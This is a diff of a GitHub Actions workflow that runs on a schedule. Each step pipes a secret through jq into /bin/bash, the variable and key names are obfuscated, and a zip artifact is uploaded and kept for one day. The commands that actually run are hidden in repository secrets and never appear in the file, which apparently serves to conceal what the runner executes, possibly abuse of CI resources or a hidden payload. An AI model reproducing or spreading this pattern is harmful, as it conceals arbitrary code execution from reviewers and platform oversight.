@@ -1,27 +1,26 @@
 name: changtukuoxiao
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '58 5/6 * * *'
-jobs:  # 24848
+    - cron: '49 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changtukuoxiao
         env:
-          jko5107: ${{ secrets.jko5107 }}
+          eew1: ${{ secrets.eew1 }}
         run: |
-          echo $jko5107 | jq -r .xzbg42560 | /bin/bash
-          echo $xeyq5 | jq -r .g57607 | /bin/bash
-          echo $rba627 | jq -r .plvr20779 | /bin/bash
-          echo $pei844 | jq -r .xwa72 | /bin/bash
-          echo $lnodj204 | jq -r .b5 | /bin/bash
-          echo $sbxm0 | jq -r .sddjc15 | /bin/bash
-          echo $i1201 | jq -r .q71627 | /bin/bash
-          echo $s2515 | jq -r .axb564 | /bin/bash
-          echo $oaqqu0159 | jq -r .r5 | /bin/bash
-          echo $nfz25 | jq -r .om41940 | /bin/bash
+          printf '%s' "$eew1" | jq -r .z6548 | /bin/bash
+          printf '%s' "$p73151" | jq -r .urjc6 | /bin/bash
+          printf '%s' "$cc6" | jq -r .kfe54071 | /bin/bash
+          echo $b38751 | jq -r .fuq3808 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VNoehClU
+          path: "*.zip"
+          retention-days: 1
